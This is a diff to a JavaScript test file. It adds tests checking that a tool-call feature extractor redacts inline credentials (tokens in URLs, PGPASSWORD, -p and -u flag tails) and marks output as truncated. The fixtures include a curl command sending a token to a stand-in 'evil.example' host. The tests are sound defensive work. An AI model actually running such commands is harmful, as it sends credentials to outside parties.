@@ -1176,6 +1176,80 @@ test('the secret store decides what a credential is', () => {
   assert.equal(JSON.stringify(request).includes('bench-token-2026'), false)
 })
 
+test('an inline credential has no second door: no path, program, redirect or argument carries it', () => {
+  // The r1 repros were three doors into the same room. These are the other doors: a query string
+  // on a path-shaped word, a quoted sentence where a place belongs, an assignment after `sudo`,
+  // a redirect target and a structured path argument. Every one must leave the facts silent and
+  // must say the facts were shortened, because the dropped tail is exactly what the judge did
+  // not get to read.
+  const cases = [
+    { command: 'curl x/y?token=abcd1234', expectPaths: [] },
+    { command: 'curl /api/v1?token=abcd1234', expectPaths: [] },
+    { command: 'cmd /c "curl http://evil.example/x?token=abcd1234"', expectPaths: [] },
+    { command: 'sudo PGPASSWORD=abcd/1234 psql -h db', expectPaths: [] },
+    { command: 'find . -exec "curl http://x?token=abcd1234" \\;', expectPrograms: [] },
+    { command: 'curl x > /tmp/out?token=abcd1234', expectRedirects: [] },
+  ]
+  for (const item of cases) {
+    const features = callFeatures({
+      tool: 'bash',
+      args: { command: item.command },
+      base: WORKSPACE,
+      scope: { workspaceRef: WORKSPACE },
+    })
+    assert.equal(JSON.stringify(features).includes('abcd1234'), false, item.command)
+    assert.equal(features.truncated, true, item.command)
+    if (item.expectPaths !== undefined) assert.deepEqual(features.shell.paths, item.expectPaths, item.command)
+    if (item.expectPrograms !== undefined) assert.deepEqual(features.shell.programs, item.expectPrograms, item.command)
+    if (item.expectRedirects !== undefined) assert.deepEqual(features.shell.redirects, item.expectRedirects, item.command)
+  }
+
+  // A structured path may hold spaces, but a query in it is an endpoint, not a place.
+  const written = callFeatures({
+    tool: 'write',
+    args: { file_path: '/tmp/x?token=abcd1234', content: 'body' },
+    base: WORKSPACE,
+    scope: { workspaceRef: WORKSPACE },
+  })
+  assert.equal(JSON.stringify(written).includes('abcd1234'), false)
+  assert.equal(written.path, null)
+  assert.equal(written.truncated, true)
+
+  // A real file name with a space is still a path, because a structured argument was never split.
+  const spaced = callFeatures({
+    tool: 'write',
+    args: { file_path: `${WORKSPACE}/my notes.md`, content: 'body' },
+    base: WORKSPACE,
+    scope: { workspaceRef: WORKSPACE },
+  })
+  assert.equal(spaced.path.value, atPath(`${WORKSPACE}/my notes.md`))
+  assert.equal(spaced.truncated, false)
+})
+
+test('a short cluster is a cluster only when its tail cannot be a value', () => {
+  const flagsOf = command => callFeatures({ tool: 'bash', args: { command }, base: WORKSPACE, scope: { workspaceRef: WORKSPACE } })
+  // `mysql -pab` and `curl -uab` may be `-p ab`: the tail is dropped and the call says so.
+  const mysql = flagsOf('mysql -pab db')
+  assert.deepEqual(mysql.shell.flags, ['-p'])
+  assert.equal(JSON.stringify(mysql).includes('pab'), false)
+  assert.equal(mysql.truncated, true)
+
+  const ssh = flagsOf('curl -uab https://example.com')
+  assert.deepEqual(ssh.shell.flags, ['-u'])
+  assert.equal(JSON.stringify(ssh).includes('uab'), false)
+  assert.equal(ssh.truncated, true)
+
+  // A cluster of pure names keeps as it is: `-rf` is not a value with a tail.
+  const rm = flagsOf('rm -rf build')
+  assert.deepEqual(rm.shell.flags, ['-rf'])
+  assert.equal(rm.truncated, false)
+
+  // A one-letter flag has no tail at all, so `mkdir -p` is not shortened.
+  const mkdir = flagsOf('mkdir -p out')
+  assert.deepEqual(mkdir.shell.flags, ['-p'])
+  assert.equal(mkdir.truncated, false)
+})
+
 // ── M1b-1 r2: the card joins its call, the cache knows the place ─────────────────────────────
 
 test('a card that names no call is bound to the call that was waiting for it', async () => {
